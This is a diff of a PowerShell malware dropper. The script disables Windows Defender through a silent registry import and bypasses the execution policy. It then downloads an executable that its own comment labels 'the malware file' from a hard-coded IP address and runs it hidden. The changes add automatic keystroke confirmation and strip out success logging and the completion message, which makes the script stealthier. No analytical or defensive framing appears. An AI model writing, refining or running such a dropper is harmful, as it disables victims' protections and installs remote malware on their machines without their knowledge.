@@ -17,7 +17,6 @@ Windows Registry Editor Version 5.00
     $regContent | Out-File -FilePath $regFilePath -Encoding ASCII
     try {
         Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Windows Defender disabled successfully." -ErrorAction SilentlyContinue
     } catch {
         Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
     }
@@ -32,7 +31,6 @@ function Download-File {
 
     try {
         Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Downloaded file from $url to $outputPath" -ErrorAction SilentlyContinue
     } catch {
         Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to download: $url" -ErrorAction SilentlyContinue
     }
@@ -45,26 +43,20 @@ function Run-Executable {
     )
 
     try {
-        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -Wait -WindowStyle Hidden
-        if ($process) {
-            $process.WaitForExit()
-            if ($process.ExitCode -ne 0) {
-                Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath. Exit code: $($process.ExitCode)" -ErrorAction SilentlyContinue
-            } else {
-                Add-Content -Path "$env:TEMP\script_log.txt" -Value "Executed $filePath successfully." -ErrorAction SilentlyContinue
-            }
-        } else {
-            Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to start process: $filePath" -ErrorAction SilentlyContinue
-        }
+        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -WindowStyle Hidden
+        $process.WaitForInputIdle()
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("Y")
+        $process.WaitForExit()
     } catch {
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Exception occurred while executing $filePath: $_" -ErrorAction SilentlyContinue
+        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath" -ErrorAction SilentlyContinue
     }
 }
 
 # Set execution policy to bypass for the current session
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-# URL of the malware file (replace with your actual URL)
+# URL of the malware file
 $malwareUrl = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
 
 # Path to download the file
@@ -76,6 +68,3 @@ Disable-WindowsDefender
 # Download and run the malware file
 Download-File -url $malwareUrl -outputPath $downloadPath
 Run-Executable -filePath $downloadPath
-
-# Display completion message
-Write-Output "Script execution completed."
